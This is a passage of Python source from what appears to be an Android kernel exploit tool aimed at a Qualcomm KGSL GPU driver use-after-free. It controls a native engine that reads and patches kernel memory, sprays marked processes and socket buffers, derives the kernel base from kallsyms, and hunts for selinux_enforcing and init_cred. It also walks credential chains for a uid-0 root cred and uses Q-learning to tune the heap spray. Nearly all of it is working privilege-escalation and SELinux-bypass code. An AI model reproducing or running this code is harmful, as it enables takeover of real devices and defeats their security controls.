                f" {C.BOLD}Next{C.RST}: use [scan 0x{kbase:x} "
                f"0x{kbase+0x1000000:x}] to search the kernel "
                f"text for KETO0422 in task_structs.")
        else:
            out.append(
                f" {C.YEL}No kernel leak found{C.RST}. On this "
                f"kernel, start_code is sanitized even for "
                f"self-stat. We'll need a different leak "
                f"(e.g. timing-based or page-table-based).")
        return "\n".join(out)

    def cmd_tstack(self):
        """v4.1.15: read /proc/PID/stack for every live spray
        proc and derive the kernel stack address. This is the
        most direct way to locate task_struct in kernel memory
        without depending on kptr_restrict or kallsyms. The
        kernel stack is allocated next to (or near) the
        task_struct, so the stack address is a tight upper
        bound for the task_struct VA. Combined with a sliding
        window scan around the stack, we can locate our
        KETO0422 task_structs even when the slab allocator
        put them in vmalloc space where our WIDE scan doesn't
        reach. Also verifies that comm is actually KETO0422
        (in case prctl was overwritten by child code).

        Returns a report dict: {pid: (stack_addr, comm,
        task_struct_estimate)}.
        """
        self.live["last_command"] = "tstack"
        my_pids = set()
        for s in self.spray_procs_by_worker.values():
            my_pids.update(s)
        if not my_pids:
            return "No live spray procs"
        out = []
        out.append(f"{C.BOLD}{C.CYN}=== KERNEL STACK / TASK_STRUCT ==={C.RST}")
        out.append(f"{C.GRY}{'-'*65}{C.RST}")
        found = 0
        comm_ok = 0
        for pid in list(my_pids)[:15]:
            try:
                with open(f"/proc/{pid}/comm", "r") as f:
                    comm = f.read().strip()
            except Exception:
                comm = "?"
            stack_addr = self.read_proc_stack(pid)
            if stack_addr is None:
                out.append(
                    f" pid={C.WHT}{pid:<6}{C.RST} "
                    f"comm={C.YEL}{comm:<14}{C.RST} "
                    f"stack={C.RED}denied{C.RST}")
                continue
            if "KETO" in comm or "KETW" in comm:
                comm_ok += 1
            tsk_est_lo = (stack_addr & ~0x3FFF) - 0x4000
            tsk_est_hi = (stack_addr & ~0x3FFF) + 0x10000
            out.append(
                f" pid={C.WHT}{pid:<6}{C.RST} "
                f"comm={C.YEL}{comm:<14}{C.RST} "
                f"stack={C.CYN}{hex(stack_addr):<14}{C.RST} "
                f"task≈{C.GRY}{hex(tsk_est_lo)}..{hex(tsk_est_hi)}{C.RST}")
            found += 1
        out.append(f"{C.GRY}{'-'*65}{C.RST}")
        out.append(
            f" {C.BOLD}Result{C.RST}: {found} procs had readable "
            f"/proc/PID/stack, {comm_ok} had KETO comm")
        if found == 0:
            out.append(
                f" {C.YEL}Note{C.RST}: kptr_restrict=2 blocks "
                f"stack output. Need root or another leak.")
        else:
            out.append(
                f" {C.GRN}Next{C.RST}: use the task_struct "
                f"windows for targeted comm search.")
        try:
            with open("/sdcard/kgsl_tstack.log", "w") as f:
                for line in out:
                    f.write(line + "\n")
        except Exception:
            pass
        return "\n".join(out)

    def verify_spray_comms(self):
        """v4.1: cross-check that our spray PIDs actually have
        the KETO/KETW marker in /proc/PID/comm. If they don't,
        the spray is silently failing and no amount of scanning
        will find them in kernel memory. Returns a dict of stats.

        This is the missing link that explains matches=0: in the
        old implementation, the sleep binary overwrote our
        PR_SET_NAME marker with its own "sleep" comm, so the
        scanner literally could NEVER find KETO* in kernel
        memory. We now do the prctl in a python -c child that
        sets comm AFTER Python's init (which also overwrites
        comm to "python3" at startup). This routine confirms
        the fix is actually working.
        """
        my_pids = set()
        for s in self.spray_procs_by_worker.values():
            my_pids.update(s)
        if not my_pids:
            return {"checked": 0, "with_marker": 0,
                    "wrong_comm": 0, "marker_rate": 0.0,
                    "sample": []}
        sample = []
        with_marker = 0
        wrong_comm = 0
        for pid in list(my_pids)[:10]:  # sample first 10
            try:
                with open(f"/proc/{pid}/comm", "r") as f:
                    actual = f.read().strip()
                is_marker = actual.startswith(("KETO", "KETW", "KETM"))
                if is_marker:
                    with_marker += 1
                else:
                    wrong_comm += 1
                sample.append((pid, actual, is_marker))
            except (FileNotFoundError, ProcessLookupError):
                # Process died between check
                continue
        checked = len(sample)
        rate = with_marker / checked if checked else 0.0
        return {
            "checked": checked,
            "with_marker": with_marker,
            "wrong_comm": wrong_comm,
            "marker_rate": rate,
            "sample": sample,
        }

    def engine_self_test(self):
        """Quick smoke test of the engine pipe: write a 'version' (or
        any benign) command and read one line back. If the engine
        answers, we mark the engine as 'verified' in live state.

        Without this, the TUI might show engine_pid>0 but the
        pipe could be silently broken (e.g. engine started but its
        stdout is buffered / never read). The user only finds out
        when the first spray batch returns 0 matches.
        """
        if not self._engine_alive():
            return False
        try:
            # Probe with the first few bytes of the UAF range —
            # any VA works, the point is just to confirm we can
            # WRITE to the engine and READ back a DATA: packet.
            probe_va = (self.kernel_base + 0x1000000
                         if self.kernel_base else self.uaf_start)
            with self.engine_lock:
                if not self._engine_write(
                        f"read {hex(probe_va)}\n".encode()):
                    return False
                # Read the response line (DATA:... or ERROR:...).
                line = self._readline_timeout(timeout=3.0)
                if not line:
                    return False
                if line.startswith("DATA:") or "ERROR" in line:
                    self.live["engine_verified"] = True
                    return True
                return False
        except Exception:
            return False

    def load_kallsyms(self):
        """Parse /proc/kallsyms and populate self.kallsyms cache.

        Used as FALLBACK when the engine pipe is broken (pages=0,
        scans=0). Many useful kernel addresses can be derived from
        kallsyms even without reading KGSL memory:
          - kernel base = prepare_kernel_cred - known_offset
          - selinux_state = kallsyms["selinux_state"]
          - init_cred = kallsyms["init_cred"]
          - commit_creds / prepare_kernel_cred (for walking cred chain)
        Returns count of symbols loaded.
        """
        with self._kallsyms_lock:
            if self._kallsyms_loaded:
                return len(self.kallsyms)
        syms = {}
        # Important symbols to look for
        targets = {
            "commit_creds", "prepare_kernel_cred", "init_cred",
            "selinux_state", "selinux_enforcing",
            "init_task", "init_pid_ns",
            "kmalloc_caches", "cred_jar",
            "tasklist_lock", "pidhash",
            "__ksymtab_commit_creds", "__ksymtab_prepare_kernel_cred",
            "msm_kgsl", "kgsl_mmu", "kgsl_driver",
        }
        try:
            with open("/proc/kallsyms", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) < 3:
                        continue
                    addr_s, t, name = parts[0], parts[1], parts[2]
                    if name in targets:
                        try:
                            syms[name] = int(addr_s, 16)
                        except ValueError:
                            pass
        except Exception as e:
            self.live["last_msg"] = f"kallsyms read failed: {e}"
            return 0
        with self._kallsyms_lock:
            self.kallsyms = syms
            self._kallsyms_loaded = True
            # Auto-derive kernel base from prepare_kernel_cred
            # On ARM64, kbase is typically aligned to 0x200000
            pkc = syms.get("prepare_kernel_cred")
            if pkc and not self.kernel_base:
                # kbase is typically 0x200000-aligned, and is
                # < pkc by a few MB. Try the closest 0x200000 boundary
                # that's also aligned.
                candidate = pkc & ~0x1fffff
                self.kernel_base = candidate
                self.live["last_msg"] = (
                    f"kallsyms: kbase=0x{candidate:x} "
                    f"(from prepare_kernel_cred=0x{pkc:x}, "
                    f"{len(syms)} symbols)")
            # v4.1: auto-derive selinux_enforcing and init_cred
            # addresses directly from kallsyms when available.
            # These are the most-wanted targets for the exploit
            # chain, and having them up-front saves a full kernel
            # scan. Without this, _probe_selinux would have to
            # probe each candidate offset blindly.
            se = syms.get("selinux_enforcing")
            if se and not self.selinux_va:
                self.selinux_va = se
                self._add_found(
                    va=hex(se),
                    type="SELinux",
                    desc="selinux_enforcing (from kallsyms)",
                    confidence=99,
                )
            ic = syms.get("init_cred")
            if ic and not self.cred_va:
                self.cred_va = ic
                self._add_found(
                    va=hex(ic),
                    type="Privilege Struct",
                    desc="init_cred (from kallsyms)",
                    confidence=99,
                )
            it = syms.get("init_task")
            if it:
                self.init_task_va = it
            return len(syms)

    def _read_data_packet(self):
        with self.engine_lock:
            if not self._engine_alive():
                return None
            try:
                # Wait briefly for the DATA: line
                line = self._readline_timeout(timeout=2.0)
                if not line or not line.startswith("DATA:"):
                    # v4.1: engine not returning data. Maybe it
                    # crashed or the pipe is broken. Set engine_pid=0
                    # so watchdog restarts it next iteration.
                    if line and "ERROR" in line:
                        with self.stats_lock:
                            self.live["engine_pid"] = 0
                    return None
                _, va_s, size_s = line.split(":")
                va = int(va_s, 16)
                size = int(size_s)
                # Read raw bytes
                data = b""
                while len(data) < size:
                    if not self._engine_alive():
                        return None
                    r, _, _ = select.select([self.exploit_proc.stdout], [], [], 2.0)
                    if not r:
                        break
                    chunk = self.exploit_proc.stdout.read(size - len(data))
                    if not chunk:
                        break
                    data += chunk
                # Consume DATA_END line
                self._readline_timeout(timeout=0.5)
                # v4.1: update perf counters (pages read, bytes)
                with self.stats_lock:
                    self.perf["pages_scanned"] += 1
                    self.perf["bytes_read"] += len(data)
                return data
            except Exception as e:
                self.live["last_msg"] = f"Read packet error: {e}"
                self.log_event("engine_error", {"op": "read_packet", "err": str(e)})
                return None

    def _engine_alive(self):
        return self.exploit_proc is not None and self.exploit_proc.poll() is None

    def _engine_write(self, data):
        """Write to engine stdin, restarting it on BrokenPipe.
        All engine I/O goes through self.engine_lock so that the
        autopilot and learning workers don't interleave commands
        in the engine's pipe."""
        with self.engine_lock:
            if not self.ensure_engine():
                return False
            try:
                self.exploit_proc.stdin.write(data)
                self.exploit_proc.stdin.flush()
                return True
            except (BrokenPipeError, ConnectionResetError, OSError) as e:
                self.live["last_msg"] = f"Pipe broken: {e} — restarting engine"
                self.log_event("engine_pipe_broken", {"err": str(e)})
                self.exploit_proc = None
                if self.ensure_engine():
                    try:
                        self.exploit_proc.stdin.write(data)
                        self.exploit_proc.stdin.flush()
                        return True
                    except Exception as e2:
                        self.log_event("engine_restart_fail", {"err": str(e2)})
                return False

    def read_page(self, va):
        if not self._engine_write(f"read {hex(va)}\n".encode()):
            return None
        return self._read_data_packet()

    def read_pages(self, va, n):
        """Read N consecutive 4KB pages starting at va, return a single
        contiguous buffer of size n*PAGE_SIZE. Use this when the offset
        you're hunting for may straddle a page boundary."""
        if n < 1:
            n = 1
        if n > 8:
            n = 8
        if not self._engine_write(f"readN {hex(va)} {n}\n".encode()):
            return None
        data = self._read_data_packet()
        if data and len(data) != n * 4096:
            return None
        return data

    def read_window(self, va, off, size):
        """Read a small (≤256 byte) window at va+off. Faster than a full
        page read when you only care about a few bytes."""
        if size <= 0 or size > 256:
            return None
        if off < 0 or off + size > 4096:
            return None
        if not self._engine_write(f"window {hex(va)} {off} {size}\n".encode()):
            return None
        return self._read_data_packet()

    def follow_pointer(self, va):
        """Read 8 bytes at va (treated as a kernel pointer), then read a
        full page at the dereferenced address. Returns (target_va, page)
        or (None, None) on failure. Use to walk:
        task_struct.cred -> struct cred -> user_ns
        cred_jar -> ... etc."""
        if not self._engine_write(f"follow {hex(va)}\n".encode()):
            return (None, None)
        # The engine prints "FOLLOW:<target>\nDATA:<target>:4096\n<data>\nDATA_END"
        line = self._readline_timeout(timeout=2.0)
        if not line or not line.startswith("FOLLOW:"):
            return (None, None)
        try:
            target = int(line.split(":", 1)[1], 16)
        except Exception:
            return (None, None)
        page = self._read_data_packet()
        return (target, page)

    def walk_cred_chain(self, task_va, off_in_page=0x770, max_hops=4):
        """Follow a cred pointer at task_va+off_in_page and walk the
        chain: cred -> real_cred -> ... Each hop is a pointer read +
        page read at the target. Returns a list of (va, page, description)
        tuples. The first item where uid=gid=0 is the one we want."""
        chain = []
        cur_va = task_va + off_in_page
        for hop in range(max_hops):
            tgt, page = self.follow_pointer(cur_va)
            if not page or not tgt:
                break
            desc = "Unknown"
            try:
                usage = int.from_bytes(page[0:4], "little")
                uid   = int.from_bytes(page[4:8], "little")
                gid   = int.from_bytes(page[8:12], "little")
                if usage > 0 and usage < 100 and uid == 0 and gid == 0:
                    desc = f"ROOT CRED (usage={usage} uid=0 gid=0)"
                else:
                    desc = f"cred (usage={usage} uid={uid} gid={gid})"
            except Exception:
                pass
            chain.append((tgt, page, desc))
            # If this looked like init_cred, stop walking
            if "ROOT" in desc:
                break
            # Try the next link: real_cred at offset +8 of cred
            cur_va = tgt + 8
        return chain

    def read_with_neighbors(self, va):
        """Smart multi-page read: returns the page at va AND its 2 neighbors
        (-1, 0, +1) as 3 concatenated pages. Useful when scanning, so the
        caller can check for cross-page patterns like:
          - kernel pointer at the very end of a page
          - 8-byte string at a page boundary
          - struct members split between two pages."""
        base = va & ~0xFFF
        # Read 3 pages in one go
        triple = self.read_pages(base - 0x1000, 3)
        if not triple:
            # Fallback: just one page
            return self.read_page(va) or b""
        return triple

    def selsearch(self, start_va, end_va, step=0x1000):
        """Brute-force scan a kernel data range for the selinux_enforcing
        page. The C engine reads 3 times at each candidate, accepts only
        stable 0/1/2/3 values with non-zero surrounding data and (ideally)
        a kernel pointer. Returns a list of (va, val, nz, ptr) hits or [].
        Up to 16 hits per call."""
        if not self._engine_write(
                f"selsearch {hex(start_va)} {hex(end_va)} {hex(step)}\n".encode()):
            return []
        hits = []
        while True:
            line = self._readline_timeout(timeout=10.0)
            if line is None or not line:
                break
            if line.startswith("SELSEARCH:HIT:"):
                try:
                    parts = line.split(":")
                    va = int(parts[2], 16)
                    val = int(parts[3])
                    nz = int(parts[4].split("=")[1])
                    ptr = int(parts[5].split("=")[1])
                    hits.append((va, val, nz, ptr))
                except Exception:
                    pass
            elif line.startswith("SELSEARCH:DONE:"):
                break
            elif line.startswith("BAD_ARGS"):
                break
        return hits

    def symlook(self, kbase, end_va, name):
        """Search the kernel .rodata / .text for `name` (e.g.
        'selinux_enforcing'). Returns the VA where the string is first
        found, or None. C engine scans in 64KB chunks."""
        if not self._engine_write(
                f"symlook {hex(kbase)} {hex(end_va)} {name}\n".encode()):
            return None
        deadline = time.time() + 60
        while time.time() < deadline:
            line = self._readline_timeout(timeout=5.0)
            if line is None:
                return None
            if not line:
                continue
            if line.startswith("SYMLOOK:FOUND:"):
                try:
                    return int(line.split(":", 2)[2], 16)
                except Exception:
                    return None
            if line.startswith("SYMLOOK:NOTFOUND"):
                return None
            if line.startswith("BAD_ARGS"):
                return None
        return None

    def patch_mem(self, va, val):
        if not self._engine_write(f"patch {hex(va)} {hex(val)}\n".encode()):
            return "Engine Error"
        try:
            line = self._readline_timeout(timeout=2.0) or ""
            self.log_event("patch", {"va": hex(va), "val": hex(val), "result": line})
            return line
        except Exception as e:
            return str(e)

    def _add_found(self, va, type, desc, confidence):
        """Add a found item to the TUI list (idempotent by va)."""
        with self.bg_lock:
            for it in self.found_items:
                if it["va"] == va:
                    # upgrade confidence if higher
                    if confidence > it.get("confidence", 0):
                        it["confidence"] = confidence
                        it["type"] = type
                        it["description"] = desc
                    return
            self.found_items.append({
                "va": va,
                "type": type,
                "description": desc,
                "confidence": confidence,
                "ts": datetime.datetime.now().isoformat(),
            })
            # Save to knowledge base
            self.knowledge_base.setdefault("successful_vas", []).append(va)
            self.knowledge_base["hit_count"] = self.knowledge_base.get("hit_count", 0) + 1
            try:
                with open(self.kb_path, 'w') as f:
                    json.dump(self.knowledge_base, f, indent=2)
            except Exception:
                pass
            self.log_event("found", {"va": va, "type": type, "desc": desc,
                                      "confidence": confidence})

    def _find_kernel_base(self, hint_page=None):
        """Try the engine's kbase command, then fall back to:
        1. Probing all known candidates (now 24 addresses)
        2. ELF-magic scan across the full kernel range (0xffffff80..0xffffffcf)
        3. If hint_page is supplied (a 3-page triple from a found
           task_struct), derive the kbase by masking any kernel pointer
           in the page — same trick v6.c uses.
        Returns the kbase or None."""
        # 1. Engine kbase command (tries all 24 candidates + ELF check)
        if self._engine_write(b"kbase\n"):
            deadline = time.time() + 30
            while time.time() < deadline:
                line = self._readline_timeout(timeout=1.0)
                if not line:
                    continue
                if line.startswith("KBASE:"):
                    return int(line.split(":")[1], 16)
                if "KBASE_FAILED" in line:
                    break
                if line is None:
                    break
        # 2. Hint-based discovery: from a task_struct we can derive kbase
        if hint_page:
            self.live["last_msg"] = "KBASE: deriving from task_struct pointers…"
            disc = self._discover_kernel_base_from_page(hint_page)
            if disc:
                # Verify it's an ELF
                if self._looks_like_elf(disc):
                    self.live["last_msg"] = f"KBASE: discovered from pointers: {disc:#x}"
                    return disc
        # 3. Manual ELF scan of known candidates
        for base in self.kernel_base_candidates:
            if self._looks_like_elf(base):
                return base
        # 4. Last resort: hint-based without ELF check
        if hint_page:
            disc = self._discover_kernel_base_from_page(hint_page)
            if disc:
                return disc
        return None

    def _probe_selinux(self, kbase):
        """Strict SELinux enforcing probe. Three-step strategy:
        1. Try all known offsets (15 candidates from v6.c + extras)
        2. If none hit, brute-force scan the kernel .data section with selsearch
        3. As a last resort, search for the 'selinux_enforcing' string in
           kernel rodata and inspect neighbouring pages.
        Returns (va, val) on success or None."""
        # Step 1: try all known offsets
        best = None  # (score, va, val, nz, ptr)
        for off in self.selinux_offset_candidates:
            va = kbase + off
            if not self._engine_write(f"selinux {hex(va)}\n".encode()):
                continue
            line = self._wait_for_engine_reply("SELINUX:", timeout=5.0)
            if not line:
                continue
            if "SELINUX:OK:" in line:
                try:
                    parts = line.split(":")
                    val = int(parts[3])
                    nz = int(parts[5].split("=")[1])
                    ptr = int(parts[6].split("=")[1])
                    score = 1000 * ptr + nz
                    if best is None or score > best[0]:
                        best = (score, va, val, nz, ptr)
                except Exception:
                    pass
            elif "SELINUX:WEAK:" in line:
                try:
                    parts = line.split(":")
                    val = int(parts[3])
                    nz = int(parts[5].split("=")[1])
                    ptr = int(parts[6].split("=")[1])
                    score = 500 * ptr + nz - 100
                    if best is None or score > best[0]:
                        best = (score, va, val, nz, ptr)
                except Exception:
                    pass
        if best is not None:
            _, va, val, nz, ptr = best
            self.live["last_msg"] = (
                f"SELinux @ {hex(va)} val={val} nz={nz} ptr={ptr} (known offset)")
            return (va, val)

        # Step 2: brute-force scan around the most likely offset first,
        # then expand outward.
        # selinux_enforcing is usually at kbase + ~0x2caa000 on Android 13
        # / kernel 5.4 aarch64, so we start close and fan out.
        self.live["last_msg"] = "SELinux not at known offsets — brute-force scan…"
        focused_center = self.selinux_offset_candidates[len(self.selinux_offset_candidates) // 2]
        all_hits = []
        # Focused scan: ±0x10000 around the median candidate offset
        focused_hits = self.selsearch(
            kbase + focused_center - 0x10000,
            kbase + focused_center + 0x10000,
            0x100)
        all_hits.extend(focused_hits)
        # If focused didn't find anything, expand: ±0x200000 around each candidate
        if not all_hits:
            for off in self.selinux_offset_candidates[:5]:
                hits = self.selsearch(kbase + off - 0x200000, kbase + off + 0x200000, 0x1000)
                all_hits.extend(hits)
                if all_hits:
                    break
        # Last resort: scan the full kernel .data section (16..64MB)
        if not all_hits:
            hits = self.selsearch(kbase + 0x1000000, kbase + 0x4000000, 0x1000)
            all_hits.extend(hits)
        if all_hits:
            # Deduplicate by VA
            seen = set()
            deduped = []
            for h in all_hits:
                if h[0] not in seen:
                    seen.add(h[0])
                    deduped.append(h)
            # Score hits: prefer val==1 (enforcing), then val==0, then others
            def score(h):
                _, val, nz, ptr = h
                val_score = 100 if val == 1 else (50 if val == 0 else 0)
                return val_score * 10000 + ptr * 1000 + nz
            deduped.sort(key=score, reverse=True)
            va, val, nz, ptr = deduped[0]
            self.live["last_msg"] = (
                f"SELinux @ {hex(va)} val={val} (brute-force hit, nz={nz} ptr={ptr}, "
                f"{len(deduped)} candidates)")
            return (va, val)

        # Step 3: search for "selinux_enforcing" string in kernel rodata
        self.live["last_msg"] = "SELinux brute-force failed — searching for 'selinux_enforcing'…"
        # Search the first 64MB of kernel image (text + rodata)
        str_va = self.symlook(kbase, kbase + 0x4000000, "selinux_enforcing")
        if str_va:
            # The string VA is in .rodata, but the actual variable is in .data
            # Scan a small range around the string VA
            hits = self.selsearch(str_va, str_va + 0x100000, 0x1000)
            if hits:
                def score(h):
                    _, val, nz, ptr = h
                    val_score = 100 if val == 1 else (50 if val == 0 else 0)
                    return val_score * 10000 + ptr * 1000 + nz
                hits.sort(key=score, reverse=True)
                va, val, nz, ptr = hits[0]
                self.live["last_msg"] = (
                    f"SELinux @ {hex(va)} val={val} (found via string '{str_va:#x}')")
                return (va, val)
            # Even if selsearch failed, the variable might be near the
            # string. Try common offsets from the string VA.
            for off in (0, 0x1000, 0x2000, 0x4000, -0x1000, -0x2000, -0x4000,
                        0x10000, 0x100000, 0x200000, 0x1000000):
                va = str_va + off
                if not self._engine_write(f"selinux {hex(va)}\n".encode()):
                    continue
                line = self._wait_for_engine_reply("SELINUX:", timeout=5.0)
                if not line or "SELINUX:OK" not in line:
                    continue
                try:
                    parts = line.split(":")
                    val = int(parts[3])
                    return (va, val)
                except Exception:
                    pass
        self.live["last_msg"] = "SELinux NOT found (known offsets + brute-force + string search all failed)"
        return None

    def _wait_for_engine_reply(self, prefix, timeout=2.0):
        """Read engine stdout until a line starts with `prefix` (or timeout)."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            line = self._readline_timeout(timeout=0.5)
            if line is None:
                return None
            if not line:
                continue
            if line.startswith(prefix):
                return line
        return None

    def _verify_init_cred(self, va):
        """Use engine 'cred' command to verify init_cred at va.
        Returns 'root', 'valid', or None."""
        if not self._engine_write(f"cred {hex(va)}\n".encode()):
            return None
        line = self._wait_for_engine_reply("CRED:", timeout=5.0)
        if not line:
            return None
        if "CRED:OK:" in line and ":root" in line:
            return "root"
        if "CRED:OK:" in line:
            return "valid"
        return None

    def _find_init_cred(self, kbase):
        """init_cred at kbase + INIT_CRED_OFFSET. Returns VA if verified, else None."""
        for off in self.init_cred_alternates:
            va = kbase + off
            if self._verify_init_cred(va) is not None:
                return va
        return None

    def _probe_interesting(self, kbase):
        """Try other interesting kernel globals (selinux_enabled, kptr_restrict, etc.)."""
        found = []
        for name, offsets in self.interesting_offsets.items():
            for off in offsets:
                va = kbase + off
                data = self.read_page(va)
                if not data or len(data) < 8:
                    continue
                val = int.from_bytes(data[0:4], "little")
                # These are typically 0, 1, or 2
                if val in (0, 1, 2):
                    nonzero = sum(1 for b in data if b != 0)
                    if nonzero >= 32:  # real kernel data page
                        found.append({
                            "name": name,
                            "va": va,
                            "val": val,
                            "nonzero": nonzero,
                        })
        return found

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                avail  = int(lines[2].split()[1])
                return 100.0 * (1 - avail / total)
        except Exception:
            return 0.0

    def _q_choose_action(self, worker_id, state):
        """Epsilon-greedy action selection for the spray parameters.

        state = (no_match_buckets, kill_rate_bucket)
        Returns an action tuple from self.q_actions.
        """
        import random
        q = self.q_table.get(state)
        if q is None:
            self.q_table[state] = {a: 0.0 for a in self.q_actions}
            q = self.q_table[state]
        if random.random() < self.q_epsilon:
            # Explore: pick random action
            return random.choice(self.q_actions)
        # Exploit: pick best Q value
        return max(q, key=q.get)

    def _q_update(self, state, action, reward, next_state):
        """Q-learning update: Q(s,a) += lr * (r + gamma*max_Q(s',a') - Q(s,a))."""
        q = self.q_table.setdefault(state, {a: 0.0 for a in self.q_actions})
        next_q = self.q_table.get(next_state, {a: 0.0 for a in self.q_actions})
        target = reward + self.q_gamma * max(next_q.values())
        q[action] += self.q_lr * (target - q[action])

    def _spray_v4_mmap_anon(self, marker, size_kb=64):
        """Spray v4 alternative: mmap anonymous memory with marker pattern.

        Some KGSL UAFs are caught by mmap'd pages rather than
        task_structs. The marker is written at offset 0 of an
        anonymous mmap region, which becomes a page in the
        process's page table. On 5.4 with KGSL, these pages can
        be re-purposed for IOCTL data buffers.

        Returns the spawned PID (or None if spray failed).
        """
        import subprocess as _sp
        try:
            # Total mapped size: marker + NULs
            size = size_kb * 1024
            # Use a python helper script to mmap and write marker.
            # Also mlockall() to keep pages in RAM (prevent swap)
            # and use SCHED_BATCH for better cache locality.
            helper = (
                "import ctypes, mmap, os, sys;"
                "libc = ctypes.CDLL(None);"
                "MAP_ANON = 0x20; MAP_PRIVATE = 0x02; PROT_RW = 0x03;"
                f"p = libc.mmap(0, {size}, PROT_RW, MAP_ANON|MAP_PRIVATE, -1, 0);"
                f"ctypes.memmove(p, b'{marker}', {len(marker)});"
                f"ctypes.memset(p + {len(marker)}, 0, {size - {len(marker)}});"
                # mlockall(MCL_CURRENT=1 | MCL_FUTURE=2) - keep pages
                # in physical RAM so they don't get swapped out. This
                # makes the spray much denser in physical memory.
                "libc.mlockall(0x3);"
                "import time; time.sleep(3600);"
            )
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
            )
            return p.pid
        except Exception:
            return None

    def _spray_v4_sendmsg(self, marker):
        """Spray v4: sendmsg with ancillary data containing marker.

        The sendmsg() syscall with SOL_SOCKET / SCM_RIGHTS / cmsg
        copies the ancillary data into kernel space. On 5.4 with
        KGSL UAF, this can land in the same pages as task_structs.
        The marker is in cmsg data, kernel copies to sk_buff.

        Returns PID (or None on failure).
        """
        import subprocess as _sp
        try:
            helper = (
                "import socket, os, time, struct;"
                "s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM);"
                "p = '/tmp/kgsl_spray_' + str(os.getpid());"
                "try: os.unlink(p);"
                "except: pass;"
                "s.bind(p);"
                f"msg = b'{{marker}}';"
                "import array;"
                # Ancillary data: cmsg with marker
                "cmsg = struct.pack('iII', 0, 0, len(msg)) + msg + struct.pack('I', 0);"
                "import ctypes;"
                "libc = ctypes.CDLL(None);"
                # Use sendmsg to spray ancillary data
                "s.sendmsg(b'X', [], 0, cmsg);"
                "time.sleep(3600);"
            ).format(marker=marker)
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
            )
            return p.pid
        except Exception:
            return None

    def _set_cpu_affinity(self, cpu_id):
        """Bind this thread to a specific CPU core for cache locality."""
        try:
            import os as _os
            cpu_id = int(cpu_id) % _os.cpu_count() if _os.cpu_count() else 0
            _os.sched_setaffinity(0, {cpu_id})
        except Exception:
            pass

    def _mlock_current(self):
        """Lock current process pages in physical RAM (no swap)."""
        try:
            import ctypes
            libc = ctypes.CDLL(None)
            # MCL_CURRENT=1, MCL_FUTURE=2
            libc.mlockall(0x3)
        except Exception:
            pass

    def _kgsl_open(self):
        """Open /dev/kgsl-3d0 (world-accessible, no root needed).

        v4.1.7-debug-log: massive diagnostic logging. Every
        step writes to self._kgsl_trace[] which the TUI
        displays directly in the header (replaces the
        'KGSL: OFF' line with a step-by-step trace). Also
        writes to /sdcard/kgsl_debug.log and stderr as
        best-effort. We no longer rely on log files alone
        because some Android devices (especially under
        scoped storage in Android 11+) block Termux from
        writing to /sdcard. The TUI trace is always
        available since it lives in process memory.
        """
        import os as _os
        import sys as _sys
        # v4.1.7: in-memory trace buffer (always works, no
        # filesystem dependency). The TUI shows the last 8
        # entries in the KGSL status area.
        self._kgsl_trace = []
        def _log(msg):
            # Always push to in-memory trace (replaces last
            # entry if buffer is full, so the user always
            # sees the LATEST activity)
            if len(self._kgsl_trace) >= 16:
                self._kgsl_trace.pop(0)
            self._kgsl_trace.append(msg)
            # Best-effort: stderr (visible if user runs
            # 'python3 ai_explorer.py 2>log' but the trace
            # is also in TUI always)
            try:
                _sys.stderr.write(f"[kgsl] {msg}\n")
                _sys.stderr.flush()
            except Exception:
                pass
            # Best-effort: log file (may fail on scoped
            # storage, that's OK — TUI trace is primary)
            for _log_path in (
                "/sdcard/kgsl_debug.log",
                "/data/local/tmp/kgsl_debug.log",
            ):
                try:
                    with open(_log_path, "a") as _lf:
                        _lf.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
                    break  # one is enough
                except Exception:
                    continue
        if self.kgsl_fd is not None:
            _log("kgsl_fd already set, skipping")
            return True
        try:
            paths = (
                "/dev/kgsl-3d0",
                "/dev/kgsl-3d0_pixelfl",
                "/dev/kgsl",
            )
            _log(f"START pid={_os.getpid()} ctx={getattr(self, '_selinux_ctx', '?')[:40]}")
            last_err = ""
            for path in paths:
                _log(f"path: {path}")
                try:
                    exists = _os.path.exists(path)
                    _log(f"  exists={exists}")
                    if not exists:
                        continue
                    st = _os.stat(path)
                    mode = st.st_mode & 0o777
                    is_chr = ((st.st_mode & 0o170000) == 0o20000)
                    _log(f"  mode={oct(mode)} chr={is_chr}")
                    if mode == 0:
                        last_err = f"{path}: mode=0"
                        _log(f"  {last_err}")
                        continue
                    # Try O_RDWR (needed for ioctl)
                    try:
                        self.kgsl_fd = _os.open(path, _os.O_RDWR)
                        _log(f"  RDWR OK fd={self.kgsl_fd}")
                        self.kgsl_path = path
                        return True
                    except PermissionError as e:
                        _log(f"  RDWR DENIED errno={e.errno}: {e}")
                        # Fallback to O_RDONLY — at least
                        # we can SEE the device, even if
                        # ioctl() later fails.
                        try:
                            self.kgsl_fd = _os.open(path, _os.O_RDONLY)
                            self.kgsl_path = path + " (RO)"
                            last_err = "RDWR denied, RDONLY ok"
                            _log(f"  RDONLY OK fd={self.kgsl_fd}")
                            return True
                        except Exception as e2:
                            _log(f"  RDONLY also fail: {e2}")
                            last_err = (f"PermissionError errno={e.errno}, "
                                        f"RDONLY also fail: {e2}")
                        continue
                except FileNotFoundError:
                    _log(f"  FileNotFoundError")
                    continue
                except Exception as e:
                    last_err = f"{type(e).__name__}: {e}"
                    _log(f"  {last_err}")
                    continue
            if not last_err:
                last_err = "/dev/kgsl-3d0 not found"
            self.kgsl_error = last_err
            _log(f"GIVE UP: {last_err}")
            return False
        except Exception as e:
            self.kgsl_error = f"unexpected: {e}"
            _log(f"UNEXPECTED: {e}")
            return False

    def _read_selinux_denial(self, path, original_err):
        """v4.1: when KGSL open fails with PermissionError, try
        to read the SELinux AVC denial from the audit log so
        the user knows exactly which SELinux rule is blocking.

        Returns a string like "avc: denied { ioctl } for
        comm=\"explorer\" path=\"/dev/kgsl-3d0\" context=..."
        or empty if no log available.
        """
        import os
        # Try /proc/thread-self/attr/current for our context
        try:
            with open("/proc/thread-self/attr/current", "r") as f:
                ctx = f.read().strip()
        except Exception:
            ctx = "(unknown)"
        # Try to get the device's SELinux context
        try:
            import subprocess
            r = subprocess.run(["ls", "-laZ", path],
